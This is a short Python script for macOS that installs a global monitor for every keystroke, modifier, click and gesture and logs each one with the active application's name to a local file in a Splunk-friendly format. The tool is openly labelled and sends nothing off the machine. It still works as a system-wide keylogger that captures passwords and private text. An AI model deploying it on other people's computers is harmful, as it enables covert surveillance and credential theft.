#!/usr/bin/env python
# cocoa_keypress_monitor.py by Bjarte Johansen is licensed under a
# License: http://ljos.mit-license.org/
 
from AppKit import NSApplication, NSApp, NSWorkspace
from Foundation import NSObject, NSLog
from Cocoa import (NSEvent, NSKeyDownMask, NSCommandKeyMask, NSControlKeyMask, NSAlternateKeyMask, NSShiftKeyMask, NSLeftMouseDownMask, NSRightMouseDownMask, NSScrollWheel, NSFlagsChangedMask, NSRightMouseDraggedMask, NSLeftMouseDraggedMask, NSScrollWheelMask, NSEventMaskGesture, NSEventMaskMagnify, NSEventMaskSwipe, NSEventMaskRotate, NSEventMaskSmartMagnify)
from PyObjCTools import AppHelper
import logging
 
class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
	mask = (NSKeyDownMask
		| NSCommandKeyMask
		| NSControlKeyMask
		| NSAlternateKeyMask
		| NSShiftKeyMask
		| NSLeftMouseDownMask
		| NSRightMouseDownMask
		| NSScrollWheel
		| NSFlagsChangedMask
		| NSRightMouseDraggedMask
		| NSLeftMouseDraggedMask
		| NSScrollWheelMask
		| NSEventMaskGesture
		| NSEventMaskMagnify
		| NSEventMaskSwipe
		| NSEventMaskRotate
		| NSEventMaskSmartMagnify)
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask, handler)
 
def handler(event):
    try:
	activeAppName = NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
        ### The string replacement is necessary for characters that cause Splunk to end the line prematurely.
        logging.info(' app="' + str(activeAppName) + '" ' + str(event).replace('\r', '<\r>').replace('\n', '<\n>').replace('\t', '<\t>').replace('\" \"', '\"<\s>\"'))
    except UnicodeEncodeError as e:
	# logging.info(event.encode('ascii', 'xmlcharrefreplace'))
        logging.info(event)
    except KeyboardInterrupt:
        AppHelper.stopEventLoop()
    except Exception as e:
        logging.info(e)
 
def main():
    app = NSApplication.sharedApplication()
    logging.basicConfig(filename='../data/keys.log', format='%(asctime)s %(message)s', level=logging.INFO)
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()
 
if __name__ == '__main__':
    main()
